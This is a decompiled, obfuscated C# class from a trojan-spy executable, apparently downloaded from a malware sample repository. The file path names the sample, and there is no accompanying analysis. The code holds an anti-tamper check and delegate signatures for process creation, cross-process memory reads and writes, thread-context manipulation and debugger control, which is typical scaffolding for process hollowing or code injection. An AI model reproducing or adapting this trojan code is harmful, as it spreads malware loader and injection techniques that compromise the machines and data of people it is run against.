// Decompiled with JetBrains decompiler
// Type: #O.#Z
// Assembly: qouzb, Version=0.0.0.0, Culture=neutral, PublicKeyToken=34256fcd934ca661
// MVID: 528C9DDA-94F5-4688-B6FB-056FFA07C362
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Spy.Win32.Generic-6c64cd522d7e6f3c0b6f0116271cde81e35213ad4a360fe569f48f99fd473e62.exe

using \u0023O;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;

namespace \u0023O
{
  [StandardModule]
  internal sealed class \u0023Z
  {
    [MethodImpl(MethodImplOptions.NoInlining)]
    static \u0023Z()
    {
      int num1 = 5;
      while (true)
      {
        int num2 = num1;
        Assembly executingAssembly;
        bool flag;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 2:
              if (!\u0023\u0023.\u0023Uk(executingAssembly.Location, true, out flag) || !flag)
                goto label_10;
              else
                goto case 3;
            case 1:
              goto label_8;
            case 3:
            case 4:
              if (executingAssembly.FullName.EndsWith("34256fcd934ca661"))
              {
                if (!\u0023Z.Qk8jwDFVejv2Z84Xcq())
                {
                  num2 = 6;
                  continue;
                }
                goto case 0;
              }
              else
                goto label_10;
            case 5:
              goto label_7;
            case 6:
              goto label_9;
            default:
              num2 = 4;
              continue;
          }
        }
label_7:
        flag = false;
        num1 = 1;
        continue;
label_8:
        executingAssembly = Assembly.GetExecutingAssembly();
        num1 = 0;
      }
label_9:
      return;
label_10:
      throw new SecurityException("Assembly has been tampered");
    }

    internal static bool EaydfgAD458vmajuwD() => true;

    internal static bool Qk8jwDFVejv2Z84Xcq() => false;

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct \u00234
    {
      public IntPtr \u00230;
      public IntPtr \u00231;
      public uint \u00232;
      private uint \u00233;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct \u0023eb
    {
      public uint \u00235;
      private string \u00236;
      private string \u00237;
      private string \u00238;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
      private byte[] \u00239;
      private IntPtr \u0023ab;
      private IntPtr \u0023bb;
      private IntPtr \u0023cb;
      private IntPtr \u0023db;
    }

    public struct \u0023lb
    {
      public \u0023Z.\u0023vb \u0023fb;
      public int \u0023gb;
      public int \u0023hb;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 86, ArraySubType = UnmanagedType.U1)]
      public byte[] \u0023ib;

      [SpecialName]
      [MethodImpl(MethodImplOptions.NoInlining)]
      public \u0023Z.\u0023yb \u0023jb()
      {
        try
        {
          return this.\u0023kb<\u0023Z.\u0023yb>();
        }
        catch (Exception ex)
        {
          \u0023Z.\u0023yb yb;
          // ISSUE: variable of a boxed type
          __Boxed<\u0023Z.\u0023yb> local1 = (ValueType) yb;
          // ISSUE: variable of a boxed type
          __Boxed<\u0023Z.\u0023lb> local2 = (ValueType) this;
          \u0023\u0023.\u0023Jk(ex, (object) local1, (object) local2);
          throw;
        }
      }

      [MethodImpl(MethodImplOptions.NoInlining)]
      private \u0023u \u0023kb<\u0023u>() where \u0023u : struct
      {
        int num1;
        IntPtr num2;
        object objectValue;
        try
        {
          num1 = Marshal.SizeOf(typeof (\u0023u));
          num2 = Marshal.AllocHGlobal(num1);
          Marshal.Copy(this.\u0023ib, 0, num2, num1);
          objectValue = RuntimeHelpers.GetObjectValue(Marshal.PtrToStructure(num2, typeof (\u0023u)));
          Marshal.FreeHGlobal(num2);
          return (\u0023u) objectValue;
        }
        catch (Exception ex)
        {
          \u0023u u;
          // ISSUE: variable of a boxed type
          __Boxed<\u0023u> local1 = (ValueType) u;
          // ISSUE: variable of a boxed type
          __Boxed<IntPtr> local2 = (ValueType) num2;
          object obj = objectValue;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<\u0023Z.\u0023lb> local4 = (ValueType) this;
          \u0023\u0023.\u0023mk(ex, (object) local1, (object) local2, obj, (object) local3, (object) local4);
          throw;
        }
      }

      internal static bool CiIaZqeEUQY5c8Dq2D() => true;

      internal static bool wQNaqmDhiG9blP6Qqb() => false;
    }

    public enum \u0023vb
    {
      \u0023ob = 1,
      \u0023nb = 2,
      \u0023mb = 3,
      \u0023qb = 4,
      \u0023pb = 5,
      \u0023rb = 6,
      \u0023ub = 7,
      \u0023sb = 8,
      \u0023tb = 9,
    }

    public struct \u0023yb
    {
      public \u0023Z.\u0023Eb \u0023wb;
      public uint \u0023xb;
    }

    public struct \u0023Eb
    {
      public uint \u0023zb;
      public uint \u0023Ab;
      public IntPtr \u0023wb;
      public IntPtr \u0023Bb;
      public uint \u0023Cb;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15, ArraySubType = UnmanagedType.U4)]
      public uint[] \u0023Db;
    }

    public delegate bool \u0023Fb([In] IntPtr obj0, [In] uint obj1, [In] int obj2, [In] uint obj3, [In] ref uint obj4);

    public delegate bool \u0023Gb(
      [In] string obj0,
      [In] string obj1,
      [In] IntPtr obj2,
      [In] IntPtr obj3,
      [In] bool obj4,
      [In] uint obj5,
      [In] IntPtr obj6,
      [In] string obj7,
      [In] ref \u0023Z.\u0023eb obj8,
      [In] ref \u0023Z.\u00234 obj9);

    public delegate bool \u0023Hb([In] IntPtr obj0, [In] int obj1, [In] ref int obj2, [In] int obj3, [In] ref int obj4);

    public delegate bool \u0023Ib([In] IntPtr obj0, [In] int obj1, [In] byte[] obj2, [In] int obj3, [In] ref int obj4);

    public delegate bool \u0023Jb([In] IntPtr obj0, [In] int[] obj1);

    public delegate uint \u0023Kb([In] IntPtr obj0, [In] int[] obj1);

    public delegate int \u0023Lb([In] IntPtr obj0, [In] int obj1);

    public delegate int \u0023Mb([In] IntPtr obj0, [In] int obj1, [In] int obj2, [In] int obj3, [In] int obj4);

    public delegate int \u0023Nb(IntPtr handle, out uint SuspendCount);

    public delegate bool \u0023Ob([In] int obj0);

    public delegate bool \u0023Pb(out \u0023Z.\u0023lb lpDebugEvent, int dwMilliseconds);

    public delegate bool \u0023Qb([In] bool KillOnExit);

    public delegate bool \u0023Rb([In] int obj0, [In] int obj1, [In] int obj2);
  }
}
